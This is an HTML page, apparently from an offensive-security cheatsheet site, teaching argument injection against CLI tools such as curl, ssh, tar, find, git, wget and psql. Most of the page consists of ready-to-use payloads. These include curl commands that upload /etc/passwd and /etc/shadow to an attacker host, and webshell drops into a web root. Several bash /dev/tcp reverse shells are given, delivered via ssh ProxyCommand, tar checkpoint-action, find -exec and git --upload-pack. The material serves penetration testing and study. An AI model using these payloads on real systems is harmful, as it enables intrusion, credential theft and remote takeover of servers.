@@ -1,0 +1,210 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Argument injection · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › Command Injection</nav><h1>Argument injection</h1><p class="cx-lede">Exploiting fixed binaries with attacker-controlled arguments - curl, ssh, tar, find, git, ImageMagick, and other high-yield targets.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1059</span><span class="cx-tag">D3FEND D3-MH, D3-PSA, D3-EI</span><span class="cx-tag">IMPACT RCE, FileRead, FileWrite</span><span class="cx-tag">OWASP A05</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>The application calls a fixed binary safely (no shell, no concatenation), but you control one or more arguments. You can't add new commands, but you can add new <em>flags</em> to the existing command - and many CLIs have flags that read files, write files, fetch URLs, or execute code.</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># curl: read local file via -o, send via --upload-file, fetch URL of choice
+;curl &lt;ATTACKER&gt;/exfil --upload-file /etc/passwd
+
+# ssh: -o ProxyCommand executes arbitrary command
+ssh -o ProxyCommand=&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1&#x27;&quot; x
+
+# tar: --checkpoint-action=exec= runs arbitrary command
+tar -cf /tmp/x.tar --checkpoint=1 --checkpoint-action=exec=id /tmp/anything
+
+# find: -exec runs arbitrary command per match
+find /tmp -exec id {} \;</code></pre></figure>
+<p>Success indicator: the original binary executes, but with a side effect from your injected flag (file read, callback, RCE).</p>
+<h2 id="why-this-is-its-own-bug-class">Why this is its own bug class</h2>
+<p>Command injection requires concatenation into a shell. Argument injection happens when the developer was <em>trying</em> to be safe:</p>
+<figure class="cx-code"><figcaption>python</figcaption><pre><code class="language-python"># Developer-thinks-this-is-safe pattern
+subprocess.run([&#x27;curl&#x27;, user_input])           # no shell=True, no concatenation</code></pre></figure>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">// Same trap, PHP
+escapeshellarg($url);                          // escapes shell metachars
+$cmd = &quot;curl &quot; . escapeshellarg($url);
+system($cmd);</code></pre></figure>
+<p>Neither is exploitable to command injection - there's no separator that survives. But if <code>user_input</code> starts with <code>-</code>, it's a <em>flag</em>, not a URL. <code>curl --output /tmp/x http://evil/payload</code> writes a file. <code>curl -K /etc/passwd</code> reads a config file. The binary is doing exactly what it's told.</p>
+<p>The bug is in the developer's mental model: "I sanitized for shell, so it's safe." Argument injection is the bug class that breaks that assumption.</p>
+<h2 id="how-to-find-it">How to find it</h2>
+<div class="cx-steps">
+<ol>
+<li>
+<p><strong>Identify the binary.</strong> Application calls <code>curl</code>, <code>ssh</code>, <code>git</code>, <code>tar</code>, <code>convert</code>, <code>ffmpeg</code>, <code>wget</code>, <code>find</code>, <code>mv</code>, <code>cp</code>, <code>gzip</code>, <code>zip</code>, <code>unzip</code>, <code>gpg</code>, <code>openssl</code>, <code>mysql</code>, <code>psql</code>, <code>pg_dump</code>, <code>mysqldump</code>, <code>nmap</code>, <code>ping</code>, <code>traceroute</code>, <code>nslookup</code>, <code>dig</code>. Anything where one parameter feeds into argv.</p>
+</li>
+<li>
+<p><strong>Send a value starting with <code>-</code>.</strong> A URL, hostname, filename, or path that begins with <code>-</code> will be parsed as a flag. If the response changes (error, different output, unexpected file appears), the value reaches argv unchanged.</p>
+</li>
+<li>
+<p><strong>Find the right flag.</strong> Read the man page. Look for flags that: write files (<code>-o</code>, <code>--output</code>), read files (<code>-K</code>, <code>--config</code>, <code>-T</code>, <code>--upload-file</code>), execute commands (<code>-e</code>, <code>--exec</code>, <code>--use-compress-program</code>), or load network resources.</p>
+</li>
+<li>
+<p><strong>Confirm via side effect.</strong> OOB callback (<code>curl &lt;ATTACKER&gt;</code>) or file write (<code>-o /tmp/canary</code>) - same techniques as blind cmdi.</p>
+</li>
+</ol>
+</div>
+<div class="cx-aside cx-tip">
+<p class="cx-aside-title">Tip</p>
+<p>The single best filter to bypass when looking for argument injection: a leading <code>-</code>. Many naive validators check for shell metacharacters but allow <code>-</code> because hyphens appear in URLs, hostnames, and filenames. <code>--config /etc/passwd</code> is alphanumeric plus dash plus slash - and reads <code>/etc/passwd</code> as a curl config file.</p>
+</div>
+<h2 id="high-value-targets">High-value targets</h2>
+<h3 id="curl">curl</h3>
+<p>The most common target. Many features, many of them dangerous when an attacker picks the URL.</p>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Effect</th>
+<th>Payload</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-o &lt;FILE&gt;</code></td>
+<td>Write to local file</td>
+<td><code>-o /var/www/html/shell.php http://&lt;ATTACKER&gt;/shell.php</code></td>
+</tr>
+<tr>
+<td><code>-O</code></td>
+<td>Write to filename from URL</td>
+<td><code>-O http://&lt;ATTACKER&gt;/anything</code></td>
+</tr>
+<tr>
+<td><code>-K &lt;FILE&gt;</code></td>
+<td>Load config file (parses local file as curl config)</td>
+<td><code>-K /etc/passwd</code></td>
+</tr>
+<tr>
+<td><code>-T &lt;FILE&gt;</code></td>
+<td>Upload local file via PUT</td>
+<td><code>-T /etc/passwd http://&lt;ATTACKER&gt;/</code></td>
+</tr>
+<tr>
+<td><code>--upload-file &lt;FILE&gt;</code></td>
+<td>Same as <code>-T</code></td>
+<td><code>--upload-file /etc/shadow http://&lt;ATTACKER&gt;/</code></td>
+</tr>
+<tr>
+<td><code>--data-binary @&lt;FILE&gt;</code></td>
+<td>Send local file as POST body</td>
+<td><code>--data-binary @/etc/passwd http://&lt;ATTACKER&gt;/</code></td>
+</tr>
+<tr>
+<td><code>--proto-default file</code></td>
+<td>Force <code>file://</code> protocol</td>
+<td>(with <code>-o /tmp/x</code> extracts files)</td>
+</tr>
+</tbody>
+</table>
+<p>Example exploitation when the application runs <code>curl &lt;user-input&gt;</code>:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Exfil /etc/passwd via PUT to your listener
+--upload-file /etc/passwd http://&lt;ATTACKER&gt;/p</code></pre></figure>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Drop a webshell in the docroot
+-o /var/www/html/s.php http://&lt;ATTACKER&gt;/s.php</code></pre></figure>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Read a local file by abusing config parser
+-K /etc/passwd
+# Exits with parse errors that include file content in error messages</code></pre></figure>
+<h3 id="ssh">ssh</h3>
+<p><code>-o</code> accepts arbitrary OpenSSH config directives, including ones that execute commands.</p>
+<table>
+<thead>
+<tr>
+<th>Directive</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>ProxyCommand</code></td>
+<td>Runs the command before connecting; arbitrary RCE</td>
+</tr>
+<tr>
+<td><code>LocalCommand</code> (with <code>PermitLocalCommand=yes</code>)</td>
+<td>Runs after auth</td>
+</tr>
+</tbody>
+</table>
+<p>Payload when application runs <code>ssh &lt;user-input&gt;</code>:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">-o ProxyCommand=&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1&#x27;&quot; anyhost</code></pre></figure>
+<p>The <code>anyhost</code> argument is required (ssh demands a target); the ProxyCommand fires before any connection attempt, so the host doesn't need to exist.</p>
+<h3 id="tar">tar</h3>
+<p><code>--checkpoint-action=exec=</code> runs an arbitrary command after each checkpoint.</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">--checkpoint=1 --checkpoint-action=exec=id /tmp/decoy</code></pre></figure>
+<p>Requires that you can pass at least one path-like argument (<code>/tmp/decoy</code>). Some tar versions also require a mode flag (<code>-cf /dev/null</code>):</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">-cf /dev/null --checkpoint=1 --checkpoint-action=exec=&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1&#x27;&quot; /tmp/decoy</code></pre></figure>
+<h3 id="find">find</h3>
+<p>The classic. <code>-exec</code> runs a command per match.</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">. -exec id \;
+. -exec bash -c &#x27;bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1&#x27; \;</code></pre></figure>
+<p>The <code>\;</code> terminates the <code>-exec</code>. URL-encode as <code>%5C%3B</code> if the application URL-decodes once.</p>
+<h3 id="git">git</h3>
+<p>Git's hooks and config can execute commands during innocuous operations.</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># git clone with --upload-pack runs the value as a command on `git ls-remote` / `git fetch`
+clone --upload-pack=&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1&#x27;&quot; &#x27;ssh://x/x&#x27;</code></pre></figure>
+<p>The CVE-2017-1000117 family (<code>ssh://</code>-URL with <code>-oProxyCommand</code>) was patched but variants still surface. Worth testing.</p>
+<h3 id="imagemagick-convert-magick">ImageMagick (<code>convert</code>, <code>magick</code>)</h3>
+<p>Historically catastrophic (ImageTragick / CVE-2016-3714). Modern versions sandbox most issues, but check anyway:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Old MVG/MSL/HTTPS coder bugs - patched but worth probing
+&#x27;http://&lt;ATTACKER&gt;/x.png|id&#x27;
+&#x27;msl:/tmp/exploit.msl&#x27;</code></pre></figure>
+<p>If the application runs <code>convert &lt;user-input&gt; output.png</code>, an input filename starting with <code>|</code> triggered shell exec on old versions.</p>
+<h3 id="ffmpeg">ffmpeg</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># HLS playlist with file:// - read local files
+-i &#x27;file:///etc/passwd&#x27; -c copy /tmp/x.txt</code></pre></figure>
+<p>If you control input, ffmpeg's protocol parser opens files, http, concat lists. Various CVEs in this space.</p>
+<h3 id="wget">wget</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">-O /var/www/html/s.php http://&lt;ATTACKER&gt;/s.php
+--use-askpass=/usr/bin/id                       # CVE-2024 family - runs the askpass binary</code></pre></figure>
+<h3 id="gzip-zip-unzip-7z">gzip / zip / unzip / 7z</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># zip with --unzip-command (rare)
+# 7z with @listfile reads file content as filename list</code></pre></figure>
+<p>These are situational; the binaries are less commonly invoked from web apps.</p>
+<h3 id="mysql-psql-mysqldump-pg_dump">mysql / psql / mysqldump / pg_dump</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># psql -c reads a command - RCE if you control the -c value
+-c &#x27;\! id&#x27;                                      # \! shells out in psql</code></pre></figure>
+<p>The <code>\!</code> meta-command in psql runs shell commands. mysql client's <code>--init-command</code> plus <code>-e</code> are similar.</p>
+<h3 id="less-obvious-targets">Less obvious targets</h3>
+<ul>
+<li><strong><code>mv</code>, <code>cp</code></strong> - <code>--target-directory=</code>, <code>--reflink</code> flags can be abused in race conditions</li>
+<li><strong><code>gpg</code></strong> - <code>--use-agent</code>, <code>--exec-path</code> - load attacker-controlled binaries</li>
+<li><strong><code>openssl</code></strong> - <code>enc -in &lt;FILE&gt;</code> reads files; useful for exfil through error messages</li>
+</ul>
+<h2 id="detection-methodology">Detection methodology</h2>
+<div class="cx-steps">
+<ol>
+<li>
+<p><strong>Send <code>--help</code> or <code>--version</code>.</strong> If the response changes to look like CLI help text, you're hitting argv directly. Almost certain argument injection.</p>
+</li>
+<li>
+<p><strong>Send a value with leading <code>-</code>.</strong> If the application errors with "unknown option," your value is being parsed as a flag.</p>
+</li>
+<li>
+<p><strong>Send <code>--config /etc/passwd</code> or <code>-K /etc/passwd</code>.</strong> For curl/wget specifically. Errors that quote file contents = file read primitive.</p>
+</li>
+<li>
+<p><strong>Send <code>--output /tmp/canary</code>.</strong> If <code>/tmp/canary</code> appears (read it via another endpoint or via cmdi if you also have it), you have file write.</p>
+</li>
+<li>
+<p><strong>Send <code>--exec id</code> or <code>-exec id \;</code>.</strong> For find/tar. Look for <code>uid=</code> in any output channel.</p>
+</li>
+</ol>
+</div>
+<h2 id="argument-vs-command-separator-">Argument-vs-command separator (<code>--</code>)</h2>
+<p>Many binaries treat <code>--</code> as "end of flags; everything after is positional." Defenders sometimes inject <code>--</code> before user input as a fix:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">curl -- &lt;user-input&gt;            # user-input cannot start with - now</code></pre></figure>
+<p>This <em>does</em> mitigate argument injection for that specific call. But many binaries don't honor <code>--</code>, and many call sites forget it. Test for whether <code>--</code> is present by sending <code>--help</code> and seeing whether help text appears (no <code>--</code> injected) or the literal <code>--help</code> is treated as a URL/filename (<code>--</code> injected upstream).</p>
+<h2 id="common-failure-modes">Common failure modes</h2>
+<ul>
+<li><strong>Value does start with <code>-</code> but doesn't reach argv.</strong> Application strips leading <code>-</code>, or wraps in quotes that survive argv splitting. Test by sending <code>-</code> alone and looking for behavior change.</li>
+<li><strong>Binary doesn't have the flag you want.</strong> Check the <em>exact</em> version. <code>curl --upload-file</code> exists in modern versions; older builds may lack it. <code>man curl</code> on a similar system to see what's available.</li>
+<li><strong>Flag exists but binary refuses to run with it.</strong> Some flags require config (<code>PermitLocalCommand=yes</code> for ssh's <code>LocalCommand</code>). Use a flag that doesn't need server-side cooperation.</li>
+<li><strong>Output is suppressed.</strong> You hit RCE via <code>find -exec id</code> but <code>id</code>'s output goes to a black hole. Wrap with OOB: <code>-exec curl &lt;ATTACKER&gt;/$(id) \;</code>.</li>
+<li><strong>Multiple arguments needed for the exploit.</strong> Application provides only one user-controlled slot. You need to fit the whole exploit into one argv element. Quote-wrapped flags (<code>-o/tmp/x</code>, no space) sometimes work; flags with <code>=</code> (<code>--output=/tmp/x</code>) usually do.</li>
+<li><strong><code>--</code> end-of-flags marker present.</strong> Application calls <code>binary -- &lt;input&gt;</code>. Argument injection mitigated for this slot. Look for other slots, or different binary.</li>
+</ul>
+<h2 id="notes">Notes</h2>
+<p>Argument injection is underrepresented in references - it sits in a gap where command-injection scanners don't trigger (no shell metacharacters) and parameter-validation tools don't trigger (input is alphanumeric plus <code>-</code>). Real-world frequency is higher than the literature suggests, especially in CI/CD systems, file processing pipelines, and admin panels that wrap CLI tools. When you see an application invoking a CLI binary, always test for argument injection before assuming the developer's <code>escapeshellarg</code>/<code>shell=False</code> defense holds.</p>
+<p>The technique scales: every additional CLI binary in the application's invocation graph is another potential argument-injection surface. A dashboard that renders Markdown via <code>pandoc</code>, generates PDFs via <code>wkhtmltopdf</code>, archives logs via <code>tar</code>, and pushes backups via <code>rsync</code> has four argument-injection candidates, each with its own flag vocabulary.</p></article><nav class="cx-pager"><a class="cx-prev" href="../filter-bypass/index.html">Previous: Filter bypass</a><a class="cx-next" href="../cheatsheet/index.html">Next: Cheatsheet</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
